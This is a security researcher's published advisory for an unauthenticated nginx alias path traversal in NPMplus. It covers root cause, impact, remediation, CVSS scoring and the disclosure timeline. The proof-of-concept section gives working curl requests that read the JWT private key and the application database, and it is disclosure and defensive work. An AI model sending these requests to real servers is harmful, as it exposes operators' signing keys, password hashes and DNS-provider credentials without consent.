# NPMplus — unauthenticated nginx alias off-by-slash path traversal

A single unauthenticated `GET` reads the backend JWT signing key, the whole application database, and stored DNS-provider credentials.

|  |  |
|---|---|
| **CVE ID** | [CVE-2026-102738](https://www.cve.org/CVERecord?id=CVE-2026-102738) — assigned by GitHub's CNA; association verified on 2026-09-30 |
| **Advisory** | [GHSA-wj85-328x-ww6r](https://github.com/ZoeyVid/NPMplus/security/advisories/GHSA-wj85-328x-ww6r) (published 2026-07-23) |
| **Product** | [ZoeyVid/NPMplus](https://github.com/ZoeyVid/NPMplus) — an nginx-proxy-manager fork |
| **Type** | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) |
| **Affected** | `2025-12-29-b1` ≤ version < `2026-07-23-r1` |
| **Fixed in** | `2026-07-23-r1` |
| **Severity** | Critical — CVSS 3.1 **10.0** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`), as scored by the maintainer in the published advisory. See [Scoring](#scoring) for the more conservative 9.3 I argued in my report. |
| **Disclosed** | 2026-07-23 (GitHub Security Advisory) |
| **Reporter** | Lyris Vale ([@ValeLyris](https://github.com/ValeLyris)) |

> [!NOTE]
> **CVE assigned; public record not yet available at the endpoints checked.** On 2026-09-30, GitHub's [repository advisory API](https://api.github.com/repos/ZoeyVid/NPMplus/security-advisories/GHSA-wj85-328x-ww6r) returned `CVE-2026-102738` with advisory state `published`. The public CVE Services record and GitHub's global advisory endpoint both returned `404` on the same check. The repository advisory is the reference for the identifier and fix while those records catch up; assignment and global database publication are separate steps.

## Summary

NPMplus ships an nginx configuration that serves its local gravatar cache with an off-by-slash `location`/`alias` mismatch and **no authentication**. An unauthenticated remote attacker can read **any file under `/data/npmplus/`** with a single request:

```
GET /images/gravatar../<file>
```

That directory holds the application's secrets — the backend **JWT signing key** (`keys.json`), the entire **application database** (`database.sqlite`, containing admin bcrypt password hashes), and, on any deployment that uses DNS-01 certificates, the **DNS-provider API credentials in plaintext**. Reproduced at runtime on the official container image and independently on stock nginx 1.24.

## Root cause

As shipped (`rootfs/usr/local/nginx/conf/conf.d/npmplus.conf`, admin UI on `0.0.0.0:81 ssl`):

```nginx
location /images/gravatar {        # no trailing slash
    more_set_headers "...";
    alias /data/npmplus/gravatar/; # trailing slash
}
```

This is the classic nginx off-by-slash `alias` trap. With a `location` that has no trailing slash but an `alias` that does, nginx builds the served path as `alias + (uri − location)`:

```
GET /images/gravatar../keys.json
  → /data/npmplus/gravatar/  +  ../keys.json
  → /data/npmplus/keys.json
```

The segment `gravatar..` is not a pure `..` segment, so nginx's URI normalisation does not collapse it; the `../` is applied *after* the alias join, escaping one directory level out of the gravatar cache and into `/data/npmplus/`.

Why it is reliably unauthenticated:

- The `/images/gravatar` block is served directly by nginx as static content — there is no `auth_request` / `internal` / `satisfy` / `deny` on it or on the surrounding `server`. Only `location /api` is proxied to the authenticated backend.
- `start.sh` runs `mkdir -vp /data/npmplus/gravatar` on every boot, so the alias directory always exists and the `../` always resolves.
- The high-value files sit exactly one level up, so a single traversal reaches all of them. Deeper attempts (`../../etc/passwd`, `..%2f…`) are collapsed to 404, but one level is enough.

A second instance of the same bug class exists in `backend/templates/proxy_host.conf` (an Anubis static `alias`), exposed when a host uses Anubis **with custom images enabled** (`AUTH_REQUEST_ANUBIS_USE_CUSTOM_IMAGES=true`). I identified that one by config review and did **not** separately exploit it in the lab; the maintainer applied the same trailing-slash fix there in `2026-07-23-r1`.

**Not affected:** upstream `jc21/nginx-proxy-manager` links avatars straight to gravatar.com and ships no local `/images/gravatar` alias. This is specific to NPMplus's gravatar-cache feature.

## Impact

A single unauthenticated `GET`, no credentials, discloses the `/data/npmplus/` subtree:

- **`keys.json`** — the RSA key pair used to sign and verify auth JWTs. Leaking the private half breaks the integrity root of trust for every token verified against its public half.
- **`database.sqlite`** — the whole application database: admin email/roles and **bcrypt (cost 13)** password hashes.
- **DNS-provider API credentials in plaintext** — when an operator configures a DNS-01 certificate (normal usage), NPMplus stores the provider credential in `certificate.meta` as cleartext. Confirmed end to end: after an authenticated admin created a DNS-01 certificate with a placeholder token, an *unauthenticated* re-read of the DB returned the token in cleartext. A real token can allow DNS changes and rogue certificate issuance within its provider permissions; the reach depends on the token's scope. No password cracking or JWT forgery is needed for that use of the disclosed credential.

**Not reproduced in my lab:** session forgery, auth bypass, and RCE via the leaked JWT key. The tested `2026-07-15-r1` image signs its `__Host-Http-token` cookie with a per-process random secret (`cookieParser(process.env.COOKIE_SECRET || crypto.randomBytes(16)…)`), so the JWT key alone does not yield a usable session unless the operator set a weak or known `COOKIE_SECRET`. Offline cracking of the bcrypt (cost 13) hashes is likewise not assumed.

### Earlier builds and the Anubis path

The maintainer's [impact analysis](https://github.com/ZoeyVid/NPMplus/discussions/3626) describes a wider historical impact: builds before `2026-04-04-b1` allowed forged JWTs to reach administrator features and potentially container RCE; older Basic Auth credentials and TOTP secrets could also be exposed. The custom-image Anubis path, introduced in `2026-04-04-b1`, could expose the broader data directory, including certificate private keys. These are upstream findings, not additional outcomes reproduced in my lab. The session limitation above applies to the tested build, not to every affected version.

## Proof of concept

> [!NOTE]
> The maintainer published my full report — this PoC and all eight evidence screenshots included — in the advisory itself, after the fix had shipped. Nothing on this page is disclosed ahead of upstream.

Full script in [`poc/poc.sh`](./poc/poc.sh). All requests carry no cookie or token. `--path-as-is` preserves the request target exactly; the required literal prefix is `/images/gravatar../`.

The script checks response content and status without printing secret values. By default the key response stays in memory and the database probe requests only its 16-byte header; it rejects a larger database response if the server ignores the range. Exit `1` means a private-key marker or SQLite header was disclosed, `0` means neither file was disclosed at the tested endpoint (both probes returned `403` or `404`), and `2` means the result is inconclusive. A blocked response does not by itself prove that the installed build is patched. `--dump DIR` explicitly downloads full copies and must be treated as sensitive evidence.

```bash
# steal the JWT signing private key
curl -sk --path-as-is 'https://<HOST>:8081/images/gravatar../keys.json'
#   → 200  {"key":"-----BEGIN PRIVATE KEY-----\nMIIE...","pub":"..."}

# exfiltrate the whole database
curl -sk --path-as-is 'https://<HOST>:8081/images/gravatar../database.sqlite' -o database.sqlite
#   → 200, ~110 KB SQLite; admin hashes + certificate.meta (DNS token in cleartext)

# control: the alias root is not directory-listable, proving traversal (not public exposure)
curl -sk -o /dev/null -w '%{http_code}\n' 'https://<HOST>:8081/images/gravatar/'   # → 403
```

Confirmed on the affected build `2026-07-15-r1` of `ghcr.io/zoeyvid/npmplus` — the UI reports its version string as `2026-07-15-r1-f8f7cd0-2.15.1` (app version 2.15.1), which sits inside the affected range above — running container `nginx/1.31.3`, and independently on stock `nginx/1.24.0` with the exact config lines. The tested image was pinned to `ghcr.io/zoeyvid/npmplus@sha256:c9b2310dda2e83d7b24c00f836632bd27fa8e9923130c236d6582b2c0bc79fba` in the published report.

## Evidence

All requests unauthenticated (no cookie or token). Click any screenshot for full resolution.

**1 — NPMplus login page (the unauthenticated surface)**

[![The NPMplus login form served over HTTPS on port 8081, with no session established](./evidence/01-login-page-unauth.png)](./evidence/01-login-page-unauth.png)

**2 — Unauthenticated traversal reads the JWT signing private key (`keys.json`) in Burp, no cookie**

[![Burp Repeater: GET /images/gravatar../keys.json with no Cookie header returns 200 and a PEM-encoded private key](./evidence/02-burp-unauth-traversal-keys.json-privatekey.png)](./evidence/02-burp-unauth-traversal-keys.json-privatekey.png)

**3 — Unauthenticated traversal downloads `database.sqlite` (200, 110592 bytes)**

[![Burp Repeater: GET /images/gravatar../database.sqlite with no Cookie header returns 200 and a 110592-byte SQLite file](./evidence/03-burp-unauth-traversal-database.sqlite-200-110592.png)](./evidence/03-burp-unauth-traversal-database.sqlite-200-110592.png)

**4 — The retrieved DB's `user` table (admin)**

[![The user table from the downloaded database, showing the administrator account's email address and roles](./evidence/04-stolen-db-user-table-admin.png)](./evidence/04-stolen-db-user-table-admin.png)

**5 — The retrieved DB's `auth` table (bcrypt cost-13 hash)**

[![The auth table from the downloaded database, showing a bcrypt cost-13 password hash beginning $2b$13$](./evidence/05-stolen-db-auth-table-bcrypt-hash.png)](./evidence/05-stolen-db-auth-table-bcrypt-hash.png)

**6 — Control: `/images/gravatar/` → 403 (normal cache dir, not listable)**

[![Requesting the gravatar directory itself returns 403 Forbidden, showing the alias root is not directory-listable](./evidence/06-contrast-normal-gravatar-dir-403.png)](./evidence/06-contrast-normal-gravatar-dir-403.png)

**7 — Control: direct `/keys.json` → SPA HTML, not the key (proves traversal, not public exposure)**

[![Requesting /keys.json directly returns the frontend single-page-app HTML rather than the key file, proving the disclosure comes from traversal and not from public exposure](./evidence/07-contrast-direct-keys.json-spa-html.png)](./evidence/07-contrast-direct-keys.json-spa-html.png)

**8 — The `certificate` table from the unauthenticated download, with DNS-01 settings in `meta` (placeholder token used in the lab)**

[![The certificate table from the downloaded database, showing DNS-01 settings and a truncated meta column](./evidence/08-database-dns-cred.png)](./evidence/08-database-dns-cred.png)

The screenshot truncates `meta`; the placeholder value `dns_cloudflare_api_token=DUMMY_DNS_SECRET_TOKEN_abc123` is documented in the published advisory's reproduction, rather than fully visible in this image.

## Remediation

Fixed in [`2026-07-23-r1`](https://github.com/ZoeyVid/NPMplus/releases/tag/2026-07-23-r1). The [fix commit `a52d1eb`](https://github.com/ZoeyVid/NPMplus/commit/a52d1eb278f34fc37dee89c3d17eac929b45ffde) adds trailing slashes to both the gravatar and Anubis locations, and bumps the template version so generated host configurations are rebuilt. The shipped gravatar fix is:

```nginx
location /images/gravatar/ { alias /data/npmplus/gravatar/; }
```

Matching the trailing slashes closes this traversal. A configuration can additionally use `^~` to prevent regex locations from taking precedence:

```nginx
location ^~ /images/gravatar/ { alias /data/npmplus/gravatar/; }
```

Defence in depth: mark the static avatar location `internal;`, or do not co-locate secrets (`keys.json`, `database.sqlite`) in a directory whose child is web-served. The same trailing-slash fix applies to the Anubis `alias` in `backend/templates/proxy_host.conf`.

### If you ran an affected build

The admin UI reports a compound string like `2026-07-15-r1-f8f7cd0-2.15.1`. Only the leading date-tag is what the affected range refers to; the trailing `2.15.1` is the app version and does not track it. Anything from `2025-12-29-b1` up to but not including `2026-07-23-r1` is affected.

To test the instance in front of you — the PoC's first request, with the body discarded:

```bash
curl -sk -o /dev/null -w '%{http_code}\n' --path-as-is \
  'https://<YOUR-HOST>:81/images/gravatar../keys.json'
```

The status is only a first check. `200` can be SPA HTML or another response rather than the key, and `403` / `404` can come from access controls or an intermediate proxy. [`poc/poc.sh`](./poc/poc.sh) checks for a private-key marker and SQLite header and keeps request failures or unexpected responses inconclusive. Confirm the running image tag and regenerated configuration as well.

Updating closes the read; it does not undo one. The read needed no directory listing — the alias root returns 403, as control 6 shows — but the filenames under `/data/npmplus/` are fixed and public in the repository, so guessing them was never a barrier. After updating to a supported release containing the `2026-07-23-r1` fix, if an affected path was reachable by untrusted users:

- **The DNS-provider API token**, on DNS-01 deployments — revoke and reissue it at the provider. It is stored in `certificate.meta` in cleartext and can remain usable after you patch. Check your CT logs for certificates you did not request.
- **Every NPMplus account password** — the bcrypt cost-13 hashes were readable. Cost 13 buys time against a weak password; it does not buy immunity.
- **The JWT key pair** (`keys.json`) — rotate it.

The maintainer also recommends re-enrolling TOTP, replacing older Basic Auth credentials and secrets in custom configurations, and revoking/reissuing certificates where the historical or Anubis exposure reaches their private keys. See the [upstream response guidance](https://github.com/ZoeyVid/NPMplus/discussions/3626) for the version-dependent conditions.

## Scoring

The published advisory carries **CVSS 3.1 10.0** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`), set by the maintainer. My own report scored it more conservatively at **9.3** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`) — `I:L` for the ability to issue rogue certificates / alter DNS via the leaked provider credential, rather than `I:H`. Either way, the read primitive alone is a High (floor 7.5, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`); the credential disclosure that crosses into a separate security authority (the victim's DNS provider) is what makes Scope **Changed**.

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-07-23 | Reported privately to the maintainer. |
| 2026-07-23 | Maintainer accepted, released the fix `2026-07-23-r1`, and published [GHSA-wj85-328x-ww6r](https://github.com/ZoeyVid/NPMplus/security/advisories/GHSA-wj85-328x-ww6r). |
| 2026-07-23 | Maintainer opened discussions [#3626](https://github.com/ZoeyVid/NPMplus/discussions/3626) (explaining the issue) and [#3627](https://github.com/ZoeyVid/NPMplus/discussions/3627) ("2026-07-23-r1 — UPDATE ASAP"). |
| 2026-07-23 | Reporter credit accepted; CVE requested via GitHub. |
| 2026-09-30 | Verified that GitHub's published repository advisory is associated with **CVE-2026-102738**; this repository's index, write-up and PoC updated. The advisory metadata was last updated on 2026-09-29; that timestamp alone does not establish the exact CVE assignment time. |

## References

- [CVE-2026-102738](https://www.cve.org/CVERecord?id=CVE-2026-102738) — assigned identifier; public record not available at the endpoints checked on 2026-09-30
- [GHSA-wj85-328x-ww6r](https://github.com/ZoeyVid/NPMplus/security/advisories/GHSA-wj85-328x-ww6r) — published report, affected range, severity and reporter credit
- [Repository advisory API](https://api.github.com/repos/ZoeyVid/NPMplus/security-advisories/GHSA-wj85-328x-ww6r) — live CVE association and advisory metadata
- [Fix commit `a52d1eb`](https://github.com/ZoeyVid/NPMplus/commit/a52d1eb278f34fc37dee89c3d17eac929b45ffde) and [release `2026-07-23-r1`](https://github.com/ZoeyVid/NPMplus/releases/tag/2026-07-23-r1)
- [Maintainer impact analysis and response guidance](https://github.com/ZoeyVid/NPMplus/discussions/3626)
- [Release announcement](https://github.com/ZoeyVid/NPMplus/discussions/3627)

## Scope & testing notes

All testing was on instances fully under my control — a self-hosted NPMplus container and a local stock-nginx reproduction. No production, third-party, or internet-facing instance was accessed, fingerprinted, or scanned. The only account was a self-created test admin; the DNS-01 certificate used a placeholder token, so no real DNS-provider account was contacted. Read-only unauthenticated `GET`s only — no writes, deletes, brute force, or DoS. The lab secrets visible in the screenshots are disposable and were destroyed after testing.

---
[← All advisories](../README.md) · Lyris Vale ([@ValeLyris](https://github.com/ValeLyris))
